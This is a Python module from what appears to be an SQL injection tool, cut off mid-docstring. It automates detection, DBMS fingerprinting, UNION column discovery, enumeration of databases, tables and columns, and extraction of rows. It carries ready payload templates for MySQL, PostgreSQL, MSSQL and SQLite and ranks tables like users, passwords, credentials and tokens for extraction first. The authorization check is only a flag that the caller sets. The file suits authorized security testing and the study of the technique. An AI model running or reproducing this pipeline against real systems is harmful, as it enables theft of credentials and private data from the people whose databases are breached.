"""
Automated Schema Dumping Pipeline
==================================
Provides a full automated extraction pipeline for SQL injection schema
enumeration: detect → fingerprint → enumerate DBs → enumerate tables
→ enumerate columns → extract data.

Usage::

    from sql_attacker.schema_dumper import SchemaDumper
    from sql_attacker.engine.config import ScanConfig

    def my_request(url, method="GET", params=None, data=None):
        import urllib.request, urllib.parse
        if method == "GET" and params:
            url = url + "?" + urllib.parse.urlencode(params)
        req = urllib.request.urlopen(url, timeout=10)
        return req.read().decode("utf-8", errors="replace"), req.status

    cfg = ScanConfig()
    dumper = SchemaDumper(cfg, my_request, authorized=True, enable_extraction=True)
    result = dumper.dump("https://example.com/search", "q", db_type="mysql")
    print(dumper.to_markdown(result))

The ``request_fn`` callable must accept keyword arguments::

    request_fn(
        url: str,
        method: str = "GET",
        params: dict | None = None,   # appended to URL for GET
        data: dict | None = None,     # POST body (form-encoded)
    ) -> Any

The return value must expose either:
  * ``.status_code`` (int) and ``.text`` (str)  — requests-library style, OR
  * a ``(body: str, status: int)`` tuple.

If authorization is not granted (``authorized=False``), every probe raises
:class:`~sql_attacker.guardrails.AuthorizationError`.  Data extraction is
additionally gated by ``enable_extraction=True``.
"""

from __future__ import annotations

import csv
import io
import json
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional, Tuple

from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.reporting import Evidence, Finding
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker.guardrails import AuthorizationError, check_authorization

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# High-value table names (ordered; first match wins the highest priority tier)
# ---------------------------------------------------------------------------
_HIGH_VALUE_TABLES: List[str] = [
    "users",
    "passwords",
    "credentials",
    "admin",
    "accounts",
    "auth",
    "login",
    "members",
    "customers",
    "employees",
    "secrets",
    "tokens",
]

# ---------------------------------------------------------------------------
# UNION-based probe payloads per DB type
# ---------------------------------------------------------------------------
# Each entry maps db_type → dict of payload templates.
# The sentinel ``{COLS}`` is replaced with the NULL-padded column list.
# The sentinel ``{IDX}`` is replaced with the 1-based column index used for
# string output.  ``{TABLE}`` / ``{DB}`` / ``{COLUMNS}`` are substituted
# where needed.
_UNION_PAYLOADS: Dict[str, Dict[str, str]] = {
    "mysql": {
        "detect_error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "detect_bool_true": "' AND '1'='1",
        "detect_bool_false": "' AND '1'='2",
        "fingerprint": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
        "union_base": "' UNION SELECT {COLS}-- -",
        "databases": (
            "' UNION SELECT GROUP_CONCAT(schema_name ORDER BY schema_name"
            " SEPARATOR ','),{NULL_COLS}-- -"
        ),
        "tables": (
            "' UNION SELECT GROUP_CONCAT(table_name ORDER BY table_name"
            " SEPARATOR ','),{NULL_COLS}"
            " FROM information_schema.tables"
            " WHERE table_schema=DATABASE()-- -"
        ),
        "columns": (
            "' UNION SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position"
            " SEPARATOR ','),{NULL_COLS}"
            " FROM information_schema.columns"
            " WHERE table_name='{TABLE}'-- -"
        ),
        "data": (
            "' UNION SELECT GROUP_CONCAT({COLUMNS} SEPARATOR 0x0a),{NULL_COLS}"
            " FROM `{TABLE}` LIMIT {MAX_ROWS}-- -"
        ),
        "version": "' UNION SELECT VERSION(),{NULL_COLS}-- -",
        "current_db": "' UNION SELECT DATABASE(),{NULL_COLS}-- -",
    },
    "postgresql": {
        "detect_error": "' AND 1=CAST(VERSION() AS INTEGER)-- -",
        "detect_bool_true": "' AND '1'='1",
        "detect_bool_false": "' AND '1'='2",
        "fingerprint": "' AND 1=CAST(VERSION() AS INTEGER)-- -",
        "union_base": "' UNION SELECT {COLS}-- -",
        "databases": (
            "' UNION SELECT string_agg(datname,','),{NULL_COLS}"
            " FROM pg_database-- -"
        ),
        "tables": (
            "' UNION SELECT string_agg(table_name,','),{NULL_COLS}"
            " FROM information_schema.tables"
            " WHERE table_schema='public'-- -"
        ),
        "columns": (
            "' UNION SELECT string_agg(column_name,','),{NULL_COLS}"
            " FROM information_schema.columns"
            " WHERE table_name='{TABLE}'-- -"
        ),
        "data": (
            "' UNION SELECT string_agg(CONCAT_WS('|',{COLUMNS}),'\\n'),{NULL_COLS}"
            " FROM {TABLE} LIMIT {MAX_ROWS}-- -"
        ),
        "version": "' UNION SELECT VERSION(),{NULL_COLS}-- -",
        "current_db": "' UNION SELECT current_database(),{NULL_COLS}-- -",
    },
    "mssql": {
        "detect_error": "' AND 1=CONVERT(INT,@@VERSION)-- -",
        "detect_bool_true": "' AND '1'='1",
        "detect_bool_false": "' AND '1'='2",
        "fingerprint": "' AND 1=CONVERT(INT,@@VERSION)-- -",
        "union_base": "' UNION SELECT {COLS}-- -",
        "databases": (
            "' UNION SELECT STRING_AGG(name,','),{NULL_COLS}"
            " FROM sys.databases-- -"
        ),
        "tables": (
            "' UNION SELECT STRING_AGG(name,','),{NULL_COLS}"
            " FROM sys.tables-- -"
        ),
        "columns": (
            "' UNION SELECT STRING_AGG(COLUMN_NAME,','),{NULL_COLS}"
            " FROM INFORMATION_SCHEMA.COLUMNS"
            " WHERE TABLE_NAME='{TABLE}'-- -"
        ),
        "data": (
            "' UNION SELECT TOP {MAX_ROWS} STRING_AGG({COLUMNS},'|'),{NULL_COLS}"
            " FROM {TABLE}-- -"
        ),
        "version": "' UNION SELECT @@VERSION,{NULL_COLS}-- -",
        "current_db": "' UNION SELECT DB_NAME(),{NULL_COLS}-- -",
    },
    "sqlite": {
        "detect_error": "' AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        "detect_bool_true": "' AND '1'='1",
        "detect_bool_false": "' AND '1'='2",
        "fingerprint": "' AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        "union_base": "' UNION SELECT {COLS}-- -",
        "databases": "' UNION SELECT 'main',{NULL_COLS}-- -",
        "tables": (
            "' UNION SELECT GROUP_CONCAT(name,','),{NULL_COLS}"
            " FROM sqlite_master WHERE type='table'-- -"
        ),
        "columns": (
            "' UNION SELECT GROUP_CONCAT(name,','),{NULL_COLS}"
            " FROM pragma_table_info('{TABLE}')-- -"
        ),
        "data": (
            "' UNION SELECT GROUP_CONCAT({COLUMNS},'|'),{NULL_COLS}"
            " FROM {TABLE} LIMIT {MAX_ROWS}-- -"
        ),
        "version": "' UNION SELECT sqlite_version(),{NULL_COLS}-- -",
        "current_db": "' UNION SELECT 'main',{NULL_COLS}-- -",
    },
}

# Error patterns used to detect a successful SQL injection (db error in response)
_ERROR_PATTERNS: List[re.Pattern] = [
    re.compile(p, re.IGNORECASE)
    for p in [
        r"you have an error in your sql syntax",
        r"warning.*mysql",
        r"unclosed quotation mark",
        r"microsoft ole db provider for sql server",
        r"odbc sql server driver",
        r"ora-\d{4,}",
        r"pg::syntaxerror",
        r"sqlite[_\s]error",
        r"invalid query",
        r"sql syntax.*error",
        r"unterminated string",
        r"quoted string not properly terminated",
        r"division by zero",
        r"column.*does not exist",
        r"table.*doesn.*exist",
        r"extractvalue.*xpath",
        r"convert.*int.*varchar",
    ]
]

# DB-type fingerprint patterns keyed by response body text
_DB_FINGERPRINTS: Dict[str, re.Pattern] = {
    "mysql": re.compile(r"mysql|mariadb|5\.\d+\.\d+|8\.\d+\.\d+", re.IGNORECASE),
    "postgresql": re.compile(r"postgresql|pg::|pgsql|postgres", re.IGNORECASE),
    "mssql": re.compile(
        r"microsoft sql server|mssql|sqlncli|oledb.*sql", re.IGNORECASE
    ),
    "sqlite": re.compile(r"sqlite", re.IGNORECASE),
    "oracle": re.compile(r"ora-\d{4,}|oracle|pl/sql", re.IGNORECASE),
}


# ---------------------------------------------------------------------------
# Priority scoring
# ---------------------------------------------------------------------------


def _priority_score(table_name: str) -> int:
    """Return a priority score for *table_name*.

    Higher scores mean the table is extracted first.  High-value table names
    (users, passwords, credentials, etc.) receive the highest scores.  All
    other tables default to 0.

    Parameters
    ----------
    table_name:
        The name of the database table.

    Returns
    -------
    int
        Priority score; maximum is ``len(_HIGH_VALUE_TABLES)`` for an exact
        match on the first entry.
    """
    normalised = table_name.strip().lower()
    # Exact match scores highest; position in list determines rank
    for idx, hvt in enumerate(_HIGH_VALUE_TABLES):
        if normalised == hvt:
            return len(_HIGH_VALUE_TABLES) - idx
    # Partial match (table name contains a high-value keyword)
    for idx, hvt in enumerate(_HIGH_VALUE_TABLES):
        if hvt in normalised:
            return max(1, len(_HIGH_VALUE_TABLES) - idx - 1)
    return 0


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------


@dataclass
class TableInfo:
    """Metadata and (optionally) extracted data for a single database table.

    Attributes
    ----------
    name:
        Table name as returned by the database.
    columns:
        Ordered list of column names discovered for this table.
    row_count:
        Estimated or actual number of rows extracted (0 when extraction was
        skipped).
    priority:
        Computed priority score; higher values are extracted first.
    data:
        Extracted rows as a list of dicts mapping column name → value.
        Empty when extraction was skipped or disabled.
    """

    name: str
    columns: List[str] = field(default_factory=list)
    row_count: int = 0
    priority: int = 0
    data: List[Dict[str, str]] = field(default_factory=list)


@dataclass
class DumpResult:
    """Result of a full schema dumping run.

    Attributes
    ----------
    db_type:
        Detected (or caller-supplied) database type, e.g. ``"mysql"``.
    database_name:
        Name of the current database as reported by the DBMS.
    tables:
        List of :class:`TableInfo` objects, sorted by priority descending.
    extraction_results:
        Flat dict suitable for storing in
        :class:`~sql_attacker.models.SQLInjectionResult`'s
        ``extracted_data`` JSON field.
    total_rows_extracted:
        Sum of ``row_count`` across all tables.
    started_at:
        ISO-8601 UTC timestamp when the dump started.
    finished_at:
        ISO-8601 UTC timestamp when the dump finished (or ``None`` if still
        in progress).
    """

    db_type: str
    database_name: str
    tables: List[TableInfo] = field(default_factory=list)
    extraction_results: Dict[str, Any] = field(default_factory=dict)
    total_rows_extracted: int = 0
    started_at: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )
    finished_at: Optional[str] = None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _normalise_response(response: Any) -> Tuple[int, str]:
    """Coerce *response* to ``(status_code, body_text)``.

    Supports:
    * Objects with ``.status_code`` and ``.text`` (requests-style).
    * ``(body, status)`` or ``(status, body)`` tuples.
    * Plain strings (assumed 200).
    """
    if response is None:
        return 0, ""
    if isinstance(response, tuple):
        a, b = response
        if isinstance(a, int):
            return a, str(b)
        if isinstance(b, int):
            return b, str(a)
        return 200, str(a)
    if hasattr(response, "status_code") and hasattr(response, "text"):
        return int(response.status_code), str(response.text)
    if hasattr(response, "status") and hasattr(response, "text"):
        return int(response.status), str(response.text)
    return 200, str(response)


def _has_error(body: str) -> bool:
    """Return True if *body* contains a recognisable SQL error message."""
    return any(p.search(body) for p in _ERROR_PATTERNS)


def _build_union_cols(total: int, active_idx: int = 0) -> Tuple[str, str]:
    """Return ``(cols, null_cols)`` strings for a UNION SELECT.

    *total* is the number of columns in the original SELECT.  *active_idx*
    (0-based) is the column that will carry the real payload; all others are
    NULL.

    Returns
    -------
    cols:
        Comma-separated column list, e.g. ``"payload,NULL,NULL"``.
    null_cols:
        Remainder columns after the first (for templates that have the
        active column first and ``{NULL_COLS}`` for the rest).
    """
    parts = ["NULL"] * total
    parts[active_idx] = "payload"
    null_count = total - 1
    null_cols = ",".join(["NULL"] * null_count) if null_count > 0 else ""
    return ",".join(parts), null_cols


def _extract_value_from_body(body: str, marker: str = "MEGIDO_VAL_") -> Optional[str]:
    """Extract a delimited value from *body* using *marker* as sentinel."""
    pattern = re.compile(
        re.escape(marker) + r"(.*?)" + re.escape(marker), re.DOTALL
    )
    m = pattern.search(body)
    if m:
        return m.group(1)
    return None


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------


class SchemaDumper:
    """Automated SQL injection schema extraction pipeline.

    The pipeline runs in the following phases, each gated on the result of
    the previous:

    1. **Detect** – send a canary ``'`` and boolean probes to confirm
       injectability.
    2. **Fingerprint** – determine the database type from error messages and
       banner queries (uses the caller-supplied ``db_type`` as a hint when
       auto-detection is inconclusive).
    3. **Enumerate databases** – list accessible schema/database names.
    4. **Enumerate tables** – list tables in the current database, sorted by
       :func:`_priority_score` (high-value tables first).
    5. **Enumerate columns** – discover column names for each table, up to
       ``max_tables``.
    6. **Extract data** – pull up to ``max_rows`` rows per table (only when
       ``enable_extraction=True``).

    All probe requests are gated by :func:`~sql_attacker.guardrails.check_authorization`.
    Data extraction additionally requires ``enable_extraction=True``.

    Parameters
    ----------
    config:
        :class:`~sql_attacker.engine.config.ScanConfig` instance controlling
        timeouts, retries and other engine knobs.
    request_fn:
        Callable with signature
        ``(url, method="GET", params=None, data=None) -> response``.
        See module docstring for accepted return types.
    authorized:
        Must be ``True`` for any probe to be sent.  Mirrors the flag used by
        :func:`~sql_attacker.guardrails.check_authorization`.
    enable_extraction:
        Opt-in flag for data extraction (phases 5–6).  When ``False`` (the
        default) the dumper only performs detection, fingerprinting, and
        schema enumeration (table/column names).
    max_tables:
        Maximum number of tables to enumerate columns for.  Default: 50.
    max_columns:
        Maximum number of columns to store per table.  Default: 100.
    max_rows:
        Maximum number of rows to extract per table.  Default: 100.
    """

    # Maximum number of columns to probe when auto-detecting UNION column count
    _MAX_UNION_COLS = 20
    # Sentinel used to delimit extracted values in responses
    _SENTINEL = "MEGIDO_OUT_"

    def __init__(
        self,
        config: ScanConfig,
        request_fn: Callable,
        authorized: bool = False,
        enable_extraction: bool = False,
        max_tables: int = 50,
        max_columns: int = 100,
        max_rows: int = 100,
    ) -> None:
        self._config = config
        self._request_fn = request_fn
        self._authorized = authorized
        self._enable_extraction = enable_extraction
        self._max_tables = max_tables
        self._max_columns = max_columns
        self._max_rows = max_rows

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def dump(
        self,
        url: str,
        parameter: str,
        db_type: str = "mysql",
        method: str = "GET",
    ) -> DumpResult:
        """Run the full schema dumping pipeline against *url*/*parameter*.

        Parameters
        ----------
        url:
            Target endpoint URL.
        parameter:
            Name of the HTTP parameter suspected to be injectable.
        db_type:
            Hint for the database type.  One of ``"mysql"``, ``"postgresql"``,
            ``"mssql"``, ``"sqlite"``.  The dumper will attempt auto-detection
            but falls back to this value when inconclusive.
        method:
            HTTP method to use for probes (``"GET"`` or ``"POST"``).

        Returns
        -------
        :class:`DumpResult`
            Populated result object.  ``tables`` is empty when detection
            failed or schema enumeration returned no results.

        Raises
        ------
        ~sql_attacker.guardrails.AuthorizationError
            When ``authorized=False``.
        """
        check_authorization(self._authorized)

        result = DumpResult(
            db_type=db_type,
            database_name="",
        )

        # ---- Phase 1: Detection ------------------------------------------
        injectable, confidence, technique = self._detect(url, parameter, method)
        result.extraction_results["detection"] = {
            "injectable": injectable,
            "confidence": confidence,
            "technique": technique,
        }
        if not injectable:
            logger.info(
                "SchemaDumper: parameter '%s' does not appear injectable "
                "(confidence=%.2f)",
                parameter,
                confidence,
            )
            result.finished_at = datetime.now(timezone.utc).isoformat()
            return result

        logger.info(
            "SchemaDumper: parameter '%s' is injectable via %s (confidence=%.2f)",
            parameter,
            technique,
            confidence,
        )

        # ---- Phase 2: Fingerprint ----------------------------------------
        detected_db = self._fingerprint(url, parameter, db_type, method)
        result.db_type = detected_db
        result.extraction_results["db_type"] = detected_db

        payloads = _UNION_PAYLOADS.get(detected_db, _UNION_PAYLOADS["mysql"])

        # Auto-detect UNION column count
        col_count, active_col = self._detect_union_columns(
            url, parameter, method, payloads
        )
        result.extraction_results["union_col_count"] = col_count
        result.extraction_results["union_active_col"] = active_col

        null_cols = ",".join(["NULL"] * (col_count - 1)) if col_count > 1 else ""

        # ---- Phase 3: Current database name --------------------------------
        db_name = self._query_single(
            url,
            parameter,
            method,
            payloads["current_db"].replace("{NULL_COLS}", null_cols),
        )
        result.database_name = db_name or ""
        result.extraction_results["current_database"] = db_name or ""

        # ---- Phase 4: Enumerate databases ----------------------------------
        dbs_raw = self._query_single(
            url,
            parameter,
            method,
            payloads["databases"].replace("{NULL_COLS}", null_cols),
        )
        databases = _split_csv(dbs_raw) if dbs_raw else []
        result.extraction_results["databases"] = databases

        # ---- Phase 5: Enumerate tables ------------------------------------
        tables_raw = self._query_single(
            url,
            parameter,
            method,
            payloads["tables"].replace("{NULL_COLS}", null_cols),
        )
        table_names = _split_csv(tables_raw) if tables_raw else []
        # Sort by priority (high-value first)
        table_names.sort(key=_priority_score, reverse=True)
        result.extraction_results["table_names"] = table_names

        tables_to_process = table_names[: self._max_tables]

        # ---- Phase 6: Enumerate columns + (optionally) extract data --------
        for tname in tables_to_process:
            tinfo = TableInfo(name=tname, priority=_priority_score(tname))

            cols_payload = payloads["columns"].replace("{NULL_COLS}", null_cols).replace(
                "{TABLE}", _escape_table_name(tname)
            )
            cols_raw = self._query_single(url, parameter, method, cols_payload)
            columns = _split_csv(cols_raw)[: self._max_columns] if cols_raw else []
            tinfo.columns = columns

            if self._enable_extraction and columns:
                check_authorization(self._authorized)
                rows = self._extract_rows(
                    url, parameter, method, payloads, tname, columns, null_cols
                )
                tinfo.data = rows
                tinfo.row_count = len(rows)

            result.tables.append(tinfo)

        # Sort final table list by priority descending
        result.tables.sort(key=lambda t: t.priority, reverse=True)
        result.total_rows_extracted = sum(t.row_count for t in result.tables)

        # Populate extraction_results summary for SQLInjectionResult integration
        result.extraction_results["tables"] = [
            {
                "name": t.name,
                "columns": t.columns,
                "row_count": t.row_count,
                "priority": t.priority,
            }
            for t in result.tables
        ]

        result.finished_at = datetime.now(timezone.utc).isoformat()
        logger.info(
            "SchemaDumper: finished — %d tables enumerated, %d rows extracted",
            len(result.tables),
            result.total_rows_extracted,
        )
        return result

    def to_json(self, result: DumpResult) -> str:
        """Serialise *result* to a JSON string.

        Parameters
        ----------
        result:
            The :class:`DumpResult` to serialise.

        Returns
        -------
        str
            Pretty-printed JSON representation.
        """
        payload: Dict[str, Any] = {
            "db_type": result.db_type,
            "database_name": result.database_name,
            "started_at": result.started_at,
            "finished_at": result.finished_at,
            "total_rows_extracted": result.total_rows_extracted,
            "extraction_results": result.extraction_results,
            "tables": [
                {
                    "name": t.name,
                    "priority": t.priority,
                    "columns": t.columns,
                    "row_count": t.row_count,
                    "data": t.data,
                }
                for t in result.tables
            ],
        }
        return json.dumps(payload, indent=2, ensure_ascii=False)

    def to_csv(self, result: DumpResult, table_name: str) -> str:
        """Serialise extracted rows for *table_name* to CSV.

        Parameters
        ----------
        result:
            The :class:`DumpResult` containing the table data.
        table_name:
            Name of the table whose data should be exported.

        Returns
        -------
        str
            RFC 4180 CSV string with a header row.  Returns an empty string
            when the table is not found or has no data.
        """
        target = next(
            (t for t in result.tables if t.name == table_name), None
        )
        if target is None or not target.columns:
            return ""

        buf = io.StringIO()
        writer = csv.DictWriter(
            buf, fieldnames=target.columns, extrasaction="ignore", lineterminator="\n"
        )
        writer.writeheader()
        for row in target.data:
            writer.writerow(row)
        return buf.getvalue()

    def to_markdown(self, result: DumpResult) -> str:
        """Generate a human-readable Markdown report from *result*.

        Parameters
        ----------
        result:
            The :class:`DumpResult` to render.

        Returns
        -------
        str
            Multi-section Markdown document.
        """
        lines: List[str] = []

        lines.append("# Schema Dump Report")
        lines.append("")
        lines.append(f"| Field | Value |")
        lines.append(f"|---|---|")
        lines.append(f"| Database type | `{result.db_type}` |")
        lines.append(f"| Current database | `{result.database_name or '(unknown)'}` |")
        lines.append(f"| Started at | {result.started_at} |")
        lines.append(f"| Finished at | {result.finished_at or '(in progress)'} |")
        lines.append(
            f"| Tables enumerated | {len(result.tables)} |"
        )
        lines.append(f"| Total rows extracted | {result.total_rows_extracted} |")
        lines.append("")

        # Detection summary
        det = result.extraction_results.get("detection", {})
        if det:
            lines.append("## Detection")
            lines.append("")
            lines.append(f"- **Injectable**: {det.get('injectable', False)}")
            lines.append(f"- **Confidence**: {det.get('confidence', 0):.2f}")
            lines.append(f"- **Technique**: {det.get('technique', 'unknown')}")
            lines.append("")

        # Databases
        dbs = result.extraction_results.get("databases", [])
        if dbs:
            lines.append("## Databases")
            lines.append("")
            for db in dbs:
                lines.append(f"- `{db}`")
            lines.append("")

        # Tables
        if result.tables:
            lines.append("## Tables")
            lines.append("")
            lines.append("| Table | Priority | Columns | Rows |")
            lines.append("|---|---|---|---|")
            for t in result.tables:
                col_preview = ", ".join(t.columns[:5])
                if len(t.columns) > 5:
                    col_preview += f", … (+{len(t.columns) - 5} more)"
                lines.append(
                    f"| `{t.name}` | {t.priority} | {col_preview or '(none)'}"
                    f" | {t.row_count} |"
                )
            lines.append("")

            # Extracted data per table
            for t in result.tables:
                if not t.data:
                    continue
                lines.append(f"### Data: `{t.name}`")
                lines.append("")
                if t.columns:
                    header = "| " + " | ".join(t.columns) + " |"
                    sep = "| " + " | ".join(["---"] * len(t.columns)) + " |"
                    lines.append(header)
                    lines.append(sep)
                    for row in t.data:
                        cells = [
                            str(row.get(c, "")).replace("|", "\\|")
                            for c in t.columns
                        ]
                        lines.append("| " + " | ".join(cells) + " |")
                lines.append("")

        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Private pipeline helpers
    # ------------------------------------------------------------------

    def _probe(
        self,
        url: str,
        parameter: str,
        method: str,
        payload: str,
    ) -> Tuple[int, str]:
        """Send a single injection probe and return ``(status_code, body)``.

        The probe injects *payload* into *parameter*.  For GET requests the
        parameter is appended to the query string; for POST it is sent as
        form-encoded body data.

        Parameters
        ----------
        url:
            Target URL.
        parameter:
            Injection parameter name.
        method:
            ``"GET"`` or ``"POST"``.
        payload:
            Raw injection string (not URL-encoded; the request function is
            responsible for encoding).

        Returns
        -------
        Tuple[int, str]
            ``(http_status_code, response_body)``.
        """
        check_authorization(self._authorized)
        inject: Dict[str, str] = {parameter: payload}
        try:
            if method.upper() == "POST":
                raw = self._request_fn(url, method="POST", data=inject)
            else:
                raw = self._request_fn(url, method="GET", params=inject)
            return _normalise_response(raw)
        except Exception as exc:  # noqa: BLE001
            logger.debug("SchemaDumper: probe error — %s", exc)
            return 0, ""

    def _detect(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> Tuple[bool, float, str]:
        """Phase 1 — Determine whether *parameter* is injectable.

        Sends an error-trigger probe and a boolean differential pair, then
        scores the combined signals using :func:`~sql_attacker.engine.scoring.compute_confidence`.

        Returns
        -------
        Tuple[bool, float, str]
            ``(injectable, confidence, technique)`` where *injectable* is
            True when the parameter appears vulnerable.
        """
        features: Dict[str, float] = {}

        # Error probe
        _, err_body = self._probe(url, parameter, method, "' AND 1=1-- -")
        _, err_body2 = self._probe(url, parameter, method, "'")
        has_err = _has_error(err_body2)
        features["sql_error_pattern"] = 1.0 if has_err else 0.0

        # Boolean differential
        _, true_body = self._probe(url, parameter, method, "' AND '1'='1")
        _, false_body = self._probe(url, parameter, method, "' AND '1'='2")
        bool_diff = _body_difference_ratio(true_body, false_body)
        features["boolean_diff"] = min(1.0, bool_diff * 2)

        # Content change vs baseline
        _, baseline_body = self._probe(url, parameter, method, "1")
        content_change = _body_difference_ratio(baseline_body, false_body)
        features["content_change"] = min(1.0, content_change)

        scoring = compute_confidence(features)

        technique = "error" if has_err else ("boolean" if bool_diff > 0.1 else "none")
        injectable = scoring.score >= 0.3 or has_err

        return injectable, scoring.score, technique

    def _fingerprint(
        self,
        url: str,
        parameter: str,
        hint: str,
        method: str,
    ) -> str:
        """Phase 2 — Determine the DBMS type.

        Attempts to trigger DB-specific error messages; falls back to *hint*.

        Parameters
        ----------
        hint:
            Caller-supplied ``db_type`` to use when auto-detection is
            inconclusive.

        Returns
        -------
        str
            One of ``"mysql"``, ``"postgresql"``, ``"mssql"``, ``"sqlite"``.
        """
        probe_payloads = [
            ("mysql", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"),
            ("postgresql", "' AND 1=CAST(VERSION() AS INTEGER)-- -"),
            ("mssql", "' AND 1=CONVERT(INT,@@VERSION)-- -"),
            ("sqlite", "' AND 1=CAST(sqlite_version() AS INTEGER)-- -"),
        ]
        for db_name, payload in probe_payloads:
            _, body = self._probe(url, parameter, method, payload)
            pat = _DB_FINGERPRINTS.get(db_name)
            if pat and pat.search(body):
                logger.debug("SchemaDumper: fingerprinted as '%s'", db_name)
                return db_name

        # Secondary pass: check any response body for fingerprint patterns
        _, any_body = self._probe(url, parameter, method, "'")
        for db_name, pat in _DB_FINGERPRINTS.items():
            if pat.search(any_body):
                logger.debug(
                    "SchemaDumper: fingerprinted as '%s' from error body", db_name
                )
                return db_name

        logger.debug(
            "SchemaDumper: fingerprint inconclusive, using hint '%s'", hint
        )
        return hint if hint in _UNION_PAYLOADS else "mysql"

    def _detect_union_columns(
        self,
        url: str,
        parameter: str,
        method: str,
        payloads: Dict[str, str],
    ) -> Tuple[int, int]:
        """Detect the number of columns in the vulnerable SELECT statement.

        Iterates from 1 to :attr:`_MAX_UNION_COLS` sending
        ``UNION SELECT NULL,...`` probes until the response stops returning a
        SQL error (indicating the column count matches).

        Returns
        -------
        Tuple[int, int]
            ``(column_count, active_column_index_0based)``.  Falls back to
            ``(1, 0)`` when detection is inconclusive.
        """
        _, baseline = self._probe(url, parameter, method, "1")

        for n in range(1, self._MAX_UNION_COLS + 1):
            null_list = ",".join(["NULL"] * n)
            probe = f"' UNION SELECT {null_list}-- -"
            _, body = self._probe(url, parameter, method, probe)
            # Success: no SQL error and response differs from a broken query
            if not _has_error(body) and body.strip():
                # Find which column can carry strings — try each position
                for idx in range(n):
                    parts = ["NULL"] * n
                    parts[idx] = f"'{self._SENTINEL}'"
                    union_probe = f"' UNION SELECT {','.join(parts)}-- -"
                    _, col_body = self._probe(url, parameter, method, union_probe)
                    if self._SENTINEL in col_body:
                        logger.debug(
                            "SchemaDumper: UNION col count=%d, active col=%d", n, idx
                        )
                        return n, idx
                # Sentinel not reflected — return count with col 0
                return n, 0

        logger.debug("SchemaDumper: UNION column detection failed, defaulting to 1")
        return 1, 0

    def _query_single(
        self,
        url: str,
        parameter: str,
        method: str,
        payload: str,
    ) -> Optional[str]:
        """Send *payload* and extract the first delimited value from the body.

        Wraps the payload's first output column with :attr:`_SENTINEL` markers
        so that the response can be reliably parsed.  Returns ``None`` when
        nothing is reflected.

        Parameters
        ----------
        payload:
            A complete injection payload (already has NULL_COLS substituted).

        Returns
        -------
        Optional[str]
            Extracted string value, or ``None``.
        """
        # Wrap target column in sentinel markers by replacing the first
        # unquoted column expression with CONCAT(sentinel, expr, sentinel).
        # For simplicity we do a basic string replacement on the first
        # column placeholder patterns used in the template.
        wrapped = _wrap_first_column(payload, self._SENTINEL)
        _, body = self._probe(url, parameter, method, wrapped)
        value = _extract_value_from_body(body, self._SENTINEL)
        if value is not None:
            return value.strip()
        # Fallback: try raw regex extraction of CSV-like output
        return _extract_csv_fallback(body)

    def _extract_rows(
        self,
        url: str,
        parameter: str,
        method: str,
        payloads: Dict[str, str],
        table_name: str,
        columns: List[str],
        null_cols: str,
    ) -> List[Dict[str, str]]:
        """Phase 6 — Extract rows from *table_name*.

        Only called when ``enable_extraction=True``.  Builds a UNION SELECT
        payload that concatenates all column values with ``|`` delimiters,
        then parses the response.

        Parameters
        ----------
        columns:
            Column names to extract (already capped to ``max_columns``).
        null_cols:
            Comma-separated NULL padding for the remaining UNION columns.

        Returns
        -------
        List[Dict[str, str]]
            Each element is a dict mapping column name → cell value.
        """
        check_authorization(self._authorized)

        # Build CONCAT expression using DB-appropriate syntax
        col_expr = _build_col_expr(columns, db_type=_infer_db_from_payloads(payloads))
        payload = (
            payloads["data"]
            .replace("{NULL_COLS}", null_cols)
            .replace("{TABLE}", _escape_table_name(table_name))
            .replace("{COLUMNS}", col_expr)
            .replace("{MAX_ROWS}", str(self._max_rows))
        )

        raw = self._query_single(url, parameter, method, payload)
        if not raw:
            return []

        rows: List[Dict[str, str]] = []
        # Rows separated by newline or 0x0a literal
        row_separator = re.compile(r"\n|\\n|0x0a", re.IGNORECASE)
        for line in row_separator.split(raw):
            line = line.strip()
            if not line:
                continue
            cells = line.split("|")
            row: Dict[str, str] = {}
            for i, col in enumerate(columns):
                row[col] = cells[i].strip() if i < len(cells) else ""
            rows.append(row)

        return rows[: self._max_rows]


# ---------------------------------------------------------------------------
# Module-level utilities
# ---------------------------------------------------------------------------


def _body_difference_ratio(body_a: str, body_b: str) -> float:
    """Return a rough normalised difference ratio between two response bodies.

    Uses character-level Jaccard distance on 5-grams as a fast approximation.

    Returns
    -------
    float
        Value in ``[0, 1]``; 0 means identical, 1 means completely different.
    """
    if body_a == body_b:
        return 0.0
    if not body_a or not body_b:
        return 1.0

    def ngrams(text: str, n: int = 5) -> set:
        return {text[i : i + n] for i in range(len(text) - n + 1)}

    set_a = ngrams(body_a)
    set_b = ngrams(body_b)
    union = set_a | set_b
    if not union:
        return 0.0
    intersection = set_a & set_b
    return 1.0 - len(intersection) / len(union)


def _infer_db_from_payloads(payloads: Dict[str, str]) -> str:
    """Infer the db_type string from a payloads dictionary.

    Checks a distinctive marker in the ``tables`` payload to identify the
    DBMS type, falling back to ``"mysql"``.
    """
    tables_payload = payloads.get("tables", "")
    if "information_schema" in tables_payload and "DATABASE()" in tables_payload:
        return "mysql"
    if "pg_database" in tables_payload or "public" in tables_payload:
        return "postgresql"
    if "sys.tables" in tables_payload:
        return "mssql"
    if "sqlite_master" in tables_payload:
        return "sqlite"
    return "mysql"


def _build_col_expr(columns: List[str], db_type: str) -> str:
    """Build a DBMS-appropriate column concatenation expression.

    Returns an SQL expression that concatenates all *columns* values with a
    ``|`` delimiter and coerces each cell to a string type, using syntax
    specific to the target *db_type*.

    Parameters
    ----------
    columns:
        Column names to include.
    db_type:
